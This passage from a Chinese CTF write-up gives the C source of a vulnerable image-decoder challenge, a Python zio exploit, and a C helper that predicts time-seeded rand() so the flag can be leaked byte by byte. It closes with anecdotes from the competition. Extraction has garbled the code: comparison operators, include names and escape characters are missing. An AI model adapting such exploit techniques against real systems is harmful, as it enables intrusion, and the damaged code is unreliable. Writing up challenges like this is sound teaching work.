    #include 
    bool has_width = false;
    bool has_height = false;
    bool has_data = false;
    bool need_exit = false;
    unsigned char flag[40] = { 0 };
    void initflag()
    {
        FILE *fp = fopen("flag.txt", "rb");
        if (fp != NULL)
        {
            fread(flag, sizeof(flag), 1, fp);
            fclose(fp);
        }
    }
    unsigned int randint(unsigned int low, unsigned int high)
    {
        return rand() % (high - low) + low;
    }
    void readflag(unsigned char* buffer, unsigned int offset, unsigned int size)
    {
        int total = sizeof(flag);
        if (size > total)
        {
            size = total;
        }
        if (offset >= total)
        {
            offset = total - 1;
        }
        if (size + offset > total)
        {
            offset = randint(0, total);
            size = 1;
        }
        memcpy(buffer, flag+offset, size);
    }
    void show_welcome_msg()
    {
        fprintf(stdout, "................................................n");
        fprintf(stdout, ".       Welcome to Image Decoding System       .n");
        fprintf(stdout, "................................................n");
        fflush(stdout);
    }
    int show_main_menu()
    {
        fprintf(stdout, "nEnter a option to start:n");
        fprintf(stdout, "1. Size parametersn");
        fprintf(stdout, "2. Image datan");
        fprintf(stdout, "3. Decode imagen");
        fprintf(stdout, "4. Exitn");
        fflush(stdout);
        int result = 0;
        fscanf(stdin, "%d", &result);
        return result;
    }
    void handle_size(int& width, int& height)
    {
        fprintf(stdout, "width: ");
        fflush(stdout);
        fscanf(stdin, "%d", &width);
        fprintf(stdout, "height: ");
        fflush(stdout);
        fscanf(stdin, "%d", &height);
        if (width  0x20 || height > 0x20)
        {
            fprintf(stdout, "bad width or height :( bye byen");
            fflush(stdout);
            need_exit = true;
            return;
        }
        has_width = has_height = true;
        has_data = false;
        fprintf(stdout, "Accepted! width = %d, height = %dn", width, height);
        fflush(stdout);
    }
    void handle_data(int width, int height, unsigned char*& data)
    {
        if (!has_width || !has_height)
        {
            fprintf(stdout, "no width or height assigned, ");
            fprintf(stdout, "you need to handle choice 1 first!n");
            fflush(stdout);
            return;
        }
        has_data = false;
        if (data)
        {
            free(data);
            data = NULL;
        }
        int total = width * height;
        data = (unsigned char*)malloc(total);
        fprintf(stdout, "enter %d bytes of data, use an integer to represent a byten", total);
        fprintf(stdout, "for eaxmple, enter 65 if you want to enter character 'A'n");
        fflush(stdout);
        for (int i = 0; i  255)
            {
                fprintf(stdout, "error data format :(");
                fflush(stdout);
                return;
            }
            data[i] = char(temp & 0xFF);
        }
        has_data = true;
    }
    void handle_decode(int width, int height, unsigned char*& data)
    {
        volatile unsigned short flag_offset = randint(0, sizeof(flag));
        volatile unsigned short flag_size = 1;
        unsigned char img_data[128] = { 0 };
        if (!has_data) 
        {
            fprintf(stdout, "no data available, ");
            fprintf(stdout, "you need to handle choice 2 first!n");
            fflush(stdout);
            return;
        }
        int total = width * height;
        int offset = 0;
        if (total == 0x7FFFFFFF)
        {
            flag_size = 0;
        }
        if (total  offset)
        {
            for (int i = 0; i = total)
                {
                    break;
                }
            }
        }
        img_data[127] = '';
        fprintf(stdout, "decode result: %sn", img_data);
        fflush(stdout);
    }
    int main(int argc, char** argv)
    {
        unsigned char* data = NULL;
        int width = 0;
        int height = 0;
        initflag();
        show_welcome_msg();
        srand((unsigned int)time(NULL));
        while (!need_exit)
        {
            int choice = show_main_menu();
            switch (choice)
            {
            case 1:
                handle_size(width, height);
                break;
            case 2:
                handle_data(width, height, data);
                break;
            case 3:
                handle_decode(width, height, data);
                break;
            case 4:
            default:
                need_exit = true;
                break;
            }
        }
        return 0;
    }
可以看到flag已经读取搭配全局变量flag中，成功利用之后flag会在handle_decode的result中出现
**exp**
    from zio import *
    import commands
    def do_command(cmd_line):
    (status, output) = commands.getstatusoutput(cmd_line)
    return output
    target = "./ImageDecoder"
    def get_io(target):
    r_m = COLORED(RAW, "green")
    w_m = COLORED(RAW, "blue")
    r_m = False
    w_m = False
    io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
    return io
    def set_param(io, w, h):
    io.read_until("4. Exitn")
    io.writeline("1")
    io.read_until(": ")
    io.writeline(str(w))
    io.read_until(": ")
    io.writeline(str(h))
    def image_data(io, content):
    io.read_until("4. Exitn")
    io.writeline("2")
    io.read_until(" 'A'n")
    io.writeline(" ".join([str(ord(c)) for c in content]))
    def decode_image(io):
    io.read_until("4. Exitn")
    io.writeline("3")
    def exit_t(io):
    io.read_until("4. Exitn")
    io.writeline("4")
    def get_flag(io, payload):
    set_param(io, 16, 2)
    image_data(io, payload)
    decode_image(io)
    io.read_until("decode result: ")
    flag = io.read(1)
    return flag
    def pwn(io):
    result = do_command("./get_offset 0")
    payload = ""
    payload += l32(0x78563412)#magic number
    for i in range(4):
    payload += l8(0x1) + l8(0x0) + l8(0x2)
    payload = payload.ljust(16*2, 'b')
    flag = ['-']*40
    for item in result.strip().split(' '):
    info = item.split(":")
    offset = int(info[0])
    index = int(info[1])
    for i in range(offset):
    get_flag(io, payload)
    flag[index] = get_flag(io, payload)
    print "".join(flag)
    print "".join(flag)
    exit_t(io)
    io = get_io(target)
    pwn(io)
其中get_offset是用来辅助计算handle_decode中 randint(0, sizeof(flag));
    #include 
    #include 
    #include 
    int get_one()
    {
    return randint(0,40);
    }
    int randint(int low,int high)
    {
        return rand() % (high - low) + low;
    }
    int main(int argc,char **argv)
    {
    if(argc = index)
    {
    printf("%d:%d ",count-j,one);
    j = count + 1;
    array[i] = one;
    index++;
    }
    count++;
    }
    printf("n");
    return 0;
    }
结果显示
**花絮**
* * *
1.当时我们APK做的很快，但是提交的时候一直失败，以为没做出来，后来Web搞定之后去交Web，也是失败。和主办方核对了半天token最后发现我们把use打成了user..
2.我们拿到Flag操控无人机的时候，都是让自己无人机怼自己的基地..这样收益最大。
3.比赛过程当中大家都很懵逼，各种瞎忙瞎着急，下了台才发现自己队伍是第一。